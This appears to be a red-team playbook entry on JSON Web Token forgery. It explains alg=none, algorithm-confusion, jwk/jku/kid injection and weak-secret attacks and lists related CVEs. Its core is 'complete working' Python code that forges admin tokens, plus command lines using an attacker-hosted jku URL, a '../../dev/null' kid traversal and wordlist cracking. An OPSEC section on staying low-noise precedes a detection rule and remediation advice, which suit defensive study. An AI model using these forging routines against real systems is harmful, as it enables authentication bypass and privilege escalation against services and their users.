# JWT / JOSE Token Forgery

Forge or bypass JSON Web Tokens and the broader JOSE family (JWS/JWE) by abusing
algorithm handling and key-resolution logic. High-impact: a single forged token is
authentication/authorization bypass or privilege escalation.
ATT&CK: T1606.001 (Forge Web Credentials: Web Cookies/Tokens). CWE-347 (Improper
Verification of Cryptographic Signature), CWE-345 (Insufficient Verification of Data
Authenticity), CWE-290 (Authentication Bypass by Spoofing).

---

## 1. Theory / mechanism

A JWT is `base64url(header).base64url(payload).base64url(signature)`. The header's `alg`
field tells the verifier *how* to check the signature — and that is the flaw surface:

| Attack | Mechanism |
|--------|-----------|
| **alg=none** | Header `{"alg":"none"}` + empty signature; a verifier that honors `none` accepts any payload. |
| **Algorithm confusion (RS256→HS256)** | Server expects asymmetric `RS256/ES256` (verify with public key) but also accepts `HS256`. Attacker signs with the **public key bytes as the HMAC secret** — verifier recomputes HMAC with the same public key → valid. |
| **jwk header injection** | Embed an attacker-generated public key in the token's `jwk` header; a verifier that trusts `jwk` uses it to verify → any signature valid. |
| **jku / x5u injection** | `jku`/`x5u` points the verifier at an attacker-hosted JWKS/cert URL; server fetches attacker keys. |
| **kid injection** | `kid` is used in a file path or SQL lookup → path traversal (`../../dev/null` → empty/predictable key) or SQLi to return a known key. |
| **Weak HMAC secret** | `HS256` with a guessable secret → offline crack → forge at will. |

JWE (encrypted) adds the **partitioning-oracle / invisible-salamander** surface when built
on non-committing AEAD (see symmetric-aead.md).

---

## 2. Modern 2024-2026 variants (verified)

- **CVE-2024-54150** — a fresh JWT **algorithm-confusion** vulnerability disclosed via code
  review; reinforces that confusion bugs keep shipping in current libraries.
- **CVE-2025-61152 / CVE-2022-23540** — implementations that skip signature verification
  when `alg:"none"` (or when the verify-options are unspecified) — the alg=none class is
  still alive in 2025.
- **CVE-2025-7079, CVE-2025-6950** — **hardcoded** JWT signing keys (`bluebell-plus` string
  hardcoded in `jwt.go`; Moxa network devices) → universal token forgery.
- **CVE-2022-29217 (PyJWT) / python-jose #346** — verifying without an explicit `algorithms`
  allowlist permits HS verification against an asymmetric/OpenSSH key → confusion.
- **CVE-2022-21449 "Psychic Signatures"** — OpenJDK 15–18 accept ECDSA `(r,s)=(0,0)`; any
  `ES256/384/512` JWT forgeable with signature `MAYCAQACAQA` (see ecc-nonce-attacks.md).
- Recurring root cause (2026 reviews): *checking the library version is not enough* — the
  `algorithms=[...]` allowlist must be explicit on **every** `verify()` call.

Sources: pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150;
portswigger.net/web-security/jwt/algorithm-confusion; OWASP WSTG JWT testing;
CVE-2025-61152 / CVE-2025-7079 / CVE-2025-6950 advisories; CVE-2022-29217 (PyJWT).

---

## 3. Complete working code

`scripts/jwt_forge.py` implements every variant above (none, RS256→HS256 confusion,
jwk/jku/kid injection, weak-secret crack, psychic-sig) and a public-key recovery helper for
the confusion attack. Core routines:

```python
import base64, hmac, hashlib, json

def b64u(b):  return base64.urlsafe_b64encode(b).rstrip(b'=')
def b64ud(s): return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

def forge_none(claims: dict) -> str:
    h = b64u(json.dumps({"alg": "none", "typ": "JWT"}, separators=(',', ':')).encode())
    p = b64u(json.dumps(claims, separators=(',', ':')).encode())
    return f"{h.decode()}.{p.decode()}."          # empty signature

def forge_confusion(claims: dict, public_key_pem: bytes) -> str:
    """RS256->HS256: sign with the server's PUBLIC key bytes as the HMAC secret."""
    header  = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')).encode())
    payload = b64u(json.dumps(claims, separators=(',', ':')).encode())
    signing_input = header + b'.' + payload
    sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    return f"{header.decode()}.{payload.decode()}.{b64u(sig).decode()}"

def forge_jwk(claims: dict):
    """Embed our own RSA key in the header; verifier that trusts jwk accepts our signature."""
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes
    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = k.public_key().public_numbers()
    jwk = {"kty": "RSA",
           "n": b64u(pub.n.to_bytes(256, 'big')).decode(),
           "e": b64u(pub.e.to_bytes(3, 'big')).decode()}
    header  = b64u(json.dumps({"alg": "RS256", "typ": "JWT", "jwk": jwk},
                              separators=(',', ':')).encode())
    payload = b64u(json.dumps(claims, separators=(',', ':')).encode())
    si = header + b'.' + payload
    sig = k.sign(si, padding.PKCS1v15(), hashes.SHA256())
    return f"{header.decode()}.{payload.decode()}.{b64u(sig).decode()}"
```

### Workflow
```bash
# Recover RSA public key from two captured RS256 tokens (when the key isn't published)
python3 scripts/jwt_forge.py recover-pub tok1.jwt tok2.jwt -o jwt_pub.pem

# Forge each way
python3 scripts/jwt_forge.py none      --claims '{"sub":"admin","role":"admin"}'
python3 scripts/jwt_forge.py confusion --pubkey jwt_pub.pem --claims '{"role":"admin"}'
python3 scripts/jwt_forge.py jwk       --claims '{"role":"admin"}'
python3 scripts/jwt_forge.py jku       --claims '{"role":"admin"}' --jku https://evil/jwks.json
python3 scripts/jwt_forge.py kid       --claims '{"role":"admin"}' --kid '../../dev/null'

# Crack a weak HS256 secret offline
python3 scripts/jwt_forge.py crack token.jwt --wordlist rockyou.txt
# or: hashcat -m 16500 token.jwt wordlist.txt
```

---

## 4. Detection

```yaml
title: JWT Forgery / Algorithm Abuse
id: jwt-forge
logsource: { category: application, product: api_gateway }
detection:
  none_alg:    { jwt.header.alg|cased: ['none', 'None', 'NONE'] }
  unexpected:  { jwt.header.alg: 'HS256', jwt.expected_alg: 'RS256' }   # confusion
  ext_keysrc:  { jwt.header|contains: ['jku', 'x5u', 'jwk'] }           # external key src
  zero_sig:    { jwt.signature|re: '^(MAYCAQACAQA|AAAA)' }              # psychic / zero
  condition: none_alg or unexpected or ext_keysrc or zero_sig
level: critical
```
- IOCs: `alg:none`, an `HS*` token where `RS*/ES*` is expected, any `jku`/`x5u`/`jwk`
  header, egress fetch to an unknown JWKS URL, all-zero/`MAYCAQACAQA` ECDSA signature, and
  `kid` containing `../` or SQL metacharacters.
- EDR/network: app server makes an **outbound HTTP request to an attacker domain** during
  token verification (jku/x5u) — strong, low-FP signal.

---

## 5. OPSEC

- Each forged token is a single, legitimate-looking request — minimal noise; the loud part
  is reconnaissance (probing which `alg`s the server accepts).
- `jku`/`x5u` forgery requires an attacker-controlled host the target can reach — that
  domain is an IOC; use a throwaway domain and tear it down post-engagement.
- Weak-secret cracking is fully offline.
- In the finding, recommend: explicit `algorithms=[...]` allowlist, separate signing/verify
  keys, reject `none`/zero signatures, and `kid`/`jku` allowlisting.

---

## 6. References
- PortSwigger Web Security Academy — JWT algorithm confusion
- PentesterLab — "Another JWT Algorithm Confusion Vulnerability: CVE-2024-54150"
- OWASP WSTG — Testing JSON Web Tokens
- CVE-2024-54150, CVE-2025-61152, CVE-2025-7079, CVE-2025-6950, CVE-2022-29217 advisories
- jwt_tool — https://github.com/ticarpi/jwt_tool (reference implementation of these attacks)
